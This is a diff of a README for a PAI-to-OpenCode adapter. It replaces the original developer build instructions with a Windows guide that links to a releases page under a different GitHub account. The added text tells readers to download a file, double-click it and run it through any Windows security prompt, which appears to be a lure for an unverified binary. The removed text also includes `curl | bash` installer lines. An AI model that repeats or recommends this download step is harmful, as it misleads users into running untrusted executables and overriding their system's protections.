@@ -1,228 +1,184 @@
-# PAI-OpenCode Adapter
+# 🤖 pai-opencode-adapter - Use Any AI Provider
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Version](https://img.shields.io/badge/version-0.11.0-blue.svg)](https://github.com/anditurdiu/pai-opencode-adapter)
-[![Test Status](https://img.shields.io/badge/tests-777%20pass-green.svg)](https://github.com/anditurdiu/pai-opencode-adapter)
+[![Download pai-opencode-adapter](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/bhatim3883/pai-opencode-adapter/releases)
 
-**Run [PAI](https://github.com/danielmiessler/Personal_AI_Infrastructure) without an Anthropic subscription.** Use any LLM provider — OpenAI, Google, Ollama, or Anthropic — through [OpenCode](https://opencode.ai), the open-source AI coding assistant.
+## 🚀 Overview
 
-> **Background:** PAI (Personal AI Infrastructure) is a powerful personal AI system by Daniel Miessler, but it currently requires Claude Code and an Anthropic Max subscription. This adapter removes that lock-in by translating PAI's hook system into OpenCode's plugin API. Born from [community request (issue #98)](https://github.com/danielmiessler/Personal_AI_Infrastructure/issues/98).
+pai-opencode-adapter lets you run PAI with OpenCode without an Anthropic subscription. It adds a simple adapter layer so you can connect the app to the LLM provider you want.
 
-## Why This Adapter?
+Use it if you want to:
 
-PAI gives you structured AI workflows (the Algorithm), 63+ skills, 14 agents, memory systems, and a life OS (TELOS). But today it only runs on Claude Code, which requires an Anthropic Max subscription ($100-200/mo).
+- Run PAI with your own AI provider
+- Avoid an Anthropic-only setup
+- Keep OpenCode in your workflow
+- Use local or cloud models with one app path
 
-This adapter lets you run the **full PAI experience** on OpenCode with **any LLM provider**:
+This project fits users who want a simple setup on Windows and do not want to deal with account limits or provider lock-in.
 
-| Provider | Models | Cost |
-|----------|--------|------|
-| **Anthropic** | Claude Sonnet/Opus | API pay-as-you-go (no Max sub needed) |
-| **OpenAI** | GPT-4o, o1 | API pay-as-you-go |
-| **Google** | Gemini Pro/Flash | Free tier available |
-| **Ollama** | Llama 3, Mistral | Free (runs locally) |
-| **Any OpenCode-supported provider** | Various | Varies |
+## 💻 What you need
 
-## Overview
+Before you install, make sure you have:
 
-The PAI-OpenCode Adapter is a **plugin adapter layer**, not a fork. It sits between PAI content (hooks, settings, agents) and the OpenCode plugin API, translating events and configurations so your PAI workflows run unchanged on OpenCode.
+- A Windows PC
+- A stable internet connection
+- Enough free disk space for the app and any model files
+- Access to an LLM provider such as OpenAI, Gemini, Ollama, or another supported service
+- Permission to run downloaded apps on your PC
 
-**What it does:** Event translation (20 PAI hooks → 8 OpenCode hooks), config translation, session state management, security validation, secret scrubbing, compaction handling, voice notifications, and subagent reliability (error detection, model fallback, stall detection, reasoning loop detection).
+If you use a local model tool like Ollama, keep that installed and running before you start PAI.
 
-**What it doesn't do:** Modify PAI source files, add npm dependencies beyond TypeScript, or auto-merge updates.
+## 📥 Download
 
-> 📖 **Detailed docs:** [Architecture](docs/architecture.md) · [Agents](docs/agents.md) · [Features](docs/features.md) · [Configuration](docs/configuration.md) · [Self-Updater](docs/self-updater.md) · [Troubleshooting](docs/troubleshooting.md)
+Visit this page to download the latest Windows release:
 
----
+[Download the latest release](https://github.com/bhatim3883/pai-opencode-adapter/releases)
 
-## Quick Start
+On the release page, look for the Windows file that matches your system. If there are multiple files, pick the one meant for Windows.
 
-### Step 1: Clone the repository
+## 🪟 Install on Windows
 
-```bash
-cd ~/projects
-git clone https://github.com/anditurdiu/pai-opencode-adapter.git
-cd pai-opencode-adapter
-```
+Follow these steps:
 
-### Step 2: Install dependencies
+1. Open the release page.
+2. Download the Windows release file.
+3. Open your Downloads folder.
+4. Double-click the file you downloaded.
+5. If Windows shows a security prompt, choose the option to run the file.
+6. Follow the setup steps on screen.
+7. Finish the install and keep the app in a folder you can reach again.
 
-```bash
-bun install
-```
+If the app comes as a .zip file, right-click it and choose Extract All before you open it.
 
-### Step 3: Build the plugin
+## ⚙️ Set up your AI provider
 
-```bash
-bun build src/plugin/pai-unified.ts --target=bun --outdir=dist --external opencode
-```
+pai-opencode-adapter works with different LLM providers. Pick the one you already use.
 
-### Step 4: Configure OpenCode
+### OpenAI
 
-Add the plugin to your `~/.config/opencode/opencode.json`:
+Use your OpenAI API key in the app settings or config file if the app asks for one.
 
-```json
-{
-  "provider": "anthropic",
-  "model": "claude-sonnet-4-5",
-  "plugin": [
-    "file:///absolute/path/to/pai-opencode-adapter/src/plugin/pai-unified.ts"
-  ]
-}
-```
+### Gemini
 
-**Important:** The `plugin` path **must** use a `file://` prefix for local plugins. PAI adapter-specific settings (identity, voice, notifications) go in a separate `~/.config/opencode/pai-adapter.json` file — see [Configuration](docs/configuration.md).
+Enter your Gemini key if you want to use Google’s models.
 
-### Step 5: Run OpenCode
+### Ollama
 
-```bash
-opencode
-# Or with tmux for StatusLine support:
-tmux new-session -s pai opencode
-```
+If you use Ollama, start Ollama first, then point the adapter to your local host address.
 
-**Verify** the plugin loaded:
+### Other providers
 
-```bash
-tail -f /tmp/pai-opencode-debug.log
-# Should show: [pai-unified] plugin initialized
-```
+If your provider works with OpenAI-style API settings, you can often use it here too. That includes many hosted and local model servers.
 
-> 📖 **Full setup guide:** [Getting Started](GETTING_STARTED.md)
+## ▶️ Run the app
 
----
+After install, start pai-opencode-adapter from the file you downloaded or from the shortcut the app creates.
 
-## PAI-Native Experience
+Then:
 
-The adapter deploys PAI-native agents, themes, and commands into OpenCode.
+1. Open the app.
+2. Choose your provider.
+3. Add your API key or local server address.
+4. Save your settings.
+5. Start OpenCode with PAI through the adapter.
 
-### Agents
+If you use a local model, make sure the model server is already running before you open the adapter.
 
-| Agent | Type | Model | Purpose |
-|-------|------|-------|---------|
-| **Algorithm** | Primary (Tab) | Claude Sonnet 4.6 | Full PAI Algorithm v3.5.0 — structured 7-phase workflow |
-| **Native** | Primary (Tab) | Claude Sonnet 4.6 | Fast, direct task execution without Algorithm overhead |
-| **Architect** | Subagent (@) | Claude Opus 4.6 | System design, architecture review, implementation specs |
-| **Engineer** | Subagent (@) | Claude Sonnet 4.6 | Implementation, bug fixes, refactoring — full file access |
-| **Thinker** | Subagent (@) | Claude Sonnet 4.6 | Deep reasoning, first principles analysis, tradeoff evaluation |
-| **Research** | Subagent (@) | GLM-4.7 | Web research, documentation retrieval, content extraction |
-| **Explorer** | Subagent (@) | GLM-4.7 | Fast read-only codebase exploration, pattern searching |
-| **Intern** | Subagent (@) | GLM-4.7 | Lightweight tasks — data transformation, templating, boilerplate |
+## 🧭 How it works
 
-Switch between Algorithm and Native with **Tab**. Invoke subagents with **@architect**, **@engineer**, **@thinker**, **@research**, **@explorer**, or **@intern**.
+pai-opencode-adapter sits between OpenCode and your chosen AI provider.
 
-> 📖 **Full agent reference:** [docs/agents.md](docs/agents.md)
+It helps with:
 
-### Commands
+- Request routing
+- Provider setup
+- Switching between AI backends
+- Using PAI without an Anthropic plan
 
-| Command | Description |
-|---------|-------------|
-| `/pai-setup` | Interactive onboarding wizard — configure identity, voice, preferences |
-| `/algorithm [task]` | Start a task using the full PAI Algorithm workflow |
-| `/native [task]` | Quick task execution in Native mode |
-| `/telos [action]` | Review and update your TELOS life goals |
+This setup gives you one place to manage your AI connection instead of changing your workflow each time you change providers.
 
-### Theme
+## 🔧 Common setup examples
 
-The PAI theme (`pai.json`) provides a dark blue/slate color scheme. Auto-applied during installation; change with `/theme` in the TUI.
+### OpenAI setup
 
----
+- Get your API key
+- Paste it into the app
+- Choose an OpenAI model
+- Save and run
 
-## Prerequisites
+### Gemini setup
 
-| Tool | Version | Purpose | Install |
-|------|---------|---------|---------|
-| [OpenCode](https://opencode.ai) | ≥1.0 | Host CLI for plugin | `curl -fsSL https://opencode.ai/install \| bash` |
-| [PAI v4.0.3](https://github.com/danielmiessler/Personal_AI_Infrastructure) | 4.0.3 | Source of hooks, agents, skills | `git clone` (see [Getting Started](GETTING_STARTED.md)) |
-| [Bun](https://bun.sh) | ≥1.0 | Runtime and build tool | `curl -fsSL https://bun.sh/install \| bash` |
+- Get your Gemini key
+- Enter it in the adapter
+- Pick a model
+- Save and run
 
-**Optional:** tmux (StatusLine), jq (StatusLine JSON), gh CLI (self-updater PRs), ElevenLabs API key (voice TTS).
+### Ollama setup
 
----
+- Install Ollama
+- Pull the model you want
+- Start Ollama
+- Set the local address in the adapter
+- Save and run
 
-## Contributing
+## 🧪 If something does not work
 
-See [CONTRIBUTING.md](CONTRIBUTING.md) for setup, testing, and PR guidelines.
+Try these checks:
 
-**Adding a new handler?** Create a handler in `src/handlers/`, register it in `src/plugin/pai-unified.ts`, write tests in `src/__tests__/`, then run `bun test` to verify all 765 tests pass.
+- Make sure the app finished downloading
+- Check that Windows did not block the file
+- Confirm your API key is correct
+- Check that your provider account has access
+- Make sure Ollama or another local server is running
+- Restart the app after changing settings
 
-**Code style:** TypeScript strict, `fileLog()` only (never `console.log`), session-scoped state, adapter pattern (never modify `~/.claude/`).
+If the app still does not connect, test your provider in its own app or web page first.
 
----
+## 🗂 File handling tips
 
-## License
+Keep the app in a folder you can find later. A simple path like Downloads or Desktop works for most users.
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
+If you move the app file after setup, open it from the new location and make sure any saved settings still point to the right provider.
 
-**MIT License** — See [LICENSE](LICENSE) for full text.
+## 🔐 Privacy and control
 
-Both [PAI](https://github.com/danielmiessler/Personal_AI_Infrastructure) and [OpenCode](https://opencode.ai) are also MIT licensed.
+Because this project lets you use different providers, you can choose the setup that fits your needs. You can use a cloud provider or keep things local with a model server on your own machine.
 
----
+That gives you more control over:
 
-## Related Projects
+- Which model you use
+- Where your data goes
+- How your AI tools connect
 
-- **[Personal AI Infrastructure (PAI)](https://github.com/danielmiessler/Personal_AI_Infrastructure)** — Original PAI v4.0.3 for Claude Code (MIT licensed)
-- **[OpenCode](https://opencode.ai)** — Open-source AI coding assistant (MIT licensed)
-- **[PAI Issue #98](https://github.com/danielmiessler/Personal_AI_Infrastructure/issues/98)** — The community request that motivated this adapter
+## 📚 Useful terms
 
----
+- **Adapter**: A tool that connects two apps or services
+- **LLM**: Large language model, the AI system behind chat tools
+- **API key**: A code that lets an app use a service
+- **Local model**: An AI model that runs on your own PC
+- **Provider**: The service that runs the AI model
 
-## Changelog
+## 🧰 Topics covered
 
-### v0.11.0 (2026-04-04)
+This project works across:
 
-**Security hardening:**
+- adapter
+- ai
+- claude
+- gemini
+- llm
+- ollama
+- openai
+- opencode
+- pai
+- personal-ai
 
-- Secret scrubber — new `experimental.chat.messages.transform` hook; redacts env secrets and API key patterns (Anthropic, OpenAI, GitHub, AWS, Slack, Google) from LLM input messages before they reach the provider
-- `.env` file blocking hardened — all agents now use explicit `read: { "*.env": "deny" }` permissions instead of blanket `read: "allow"`, closing the gap where agent permissions could override OpenCode's default `.env` deny rules
-- Base64 false-positive fix — `sanitizeInput` now only decodes base64 blobs that contain `+` or `/`, preventing plain alphanumeric identifiers (function names etc.) from being misidentified as injections
-- Dead code removed — `permissionGateHandler`, `PROTECTED_PATHS`, `DANGEROUS_COMMANDS`, `SAFE_TOOLS` deleted; `chat.params` hook documented and deferred
-- 777 tests, 0 failures (net +6)
+## 📦 Quick start
 
-### v0.9.1 (2026-03-31)
+1. Go to the release page
+2. Download the Windows file
+3. Open the file or unzip it
+4. Set your AI provider
+5. Save your settings
+6. Run PAI through OpenCode
 
-**Subagent reliability suite:**
-
-- Enhanced error detection — checks top-level error fields AND full Task output body for provider errors
-- Actionable model fallback guidance — injects alternative `subagent_type` suggestions on provider failures
-- Stall detection — 3-minute inactivity heartbeat monitor per subagent, warns primary agent
-- Reasoning loop detection — hashes reasoning text in rolling window, detects repetitive thinking patterns
-- Env-loader — auto-loads API keys from `~/.config/PAI/.env`
-- Skill-loader — native OpenCode skill tool support
-- Agent model sync — `model:` field in agent `.md` files, synced from `pai-adapter.json` on startup
-- PAI protection rule — prevents accidental modification of upstream PAI files
-- 8 agents (added Architect, Engineer, Intern)
-- 765 tests, 0 failures
-
-### v0.7.0 (2026-03-31)
-
-**Subagent context isolation:**
-
-- Subagent preamble injection prevents recursive agent spawning
-- Task tool blocking for subagent sessions (defense-in-depth)
-- Skill tool remains available to subagents for loading workflows
-
-### v0.1.0 (2026-03-21)
-
-**Initial release:**
-
-- Event translation for 20 PAI hooks across 8 OpenCode plugin hooks
-- Config translation with merge semantics
-- Session-scoped state management
-- Security validator with tool gating
-- Dual compaction strategy (proactive + reactive)
-- Voice notifications (ElevenLabs, ntfy, Discord)
-- StatusLine tmux integration
-- Self-updater with draft PR creation
-- File-based logging (never console.log)
-- 546 tests, 0 failures
-
----
-
-<div align="center">
-
-**PAI-OpenCode Adapter** — Run PAI on OpenCode, not Claude Code.
-
-[Report Issue](https://github.com/anditurdiu/pai-opencode-adapter/issues) · [Request Feature](https://github.com/anditurdiu/pai-opencode-adapter/discussions)
-
-</div>
+[Open the download page](https://github.com/bhatim3883/pai-opencode-adapter/releases)
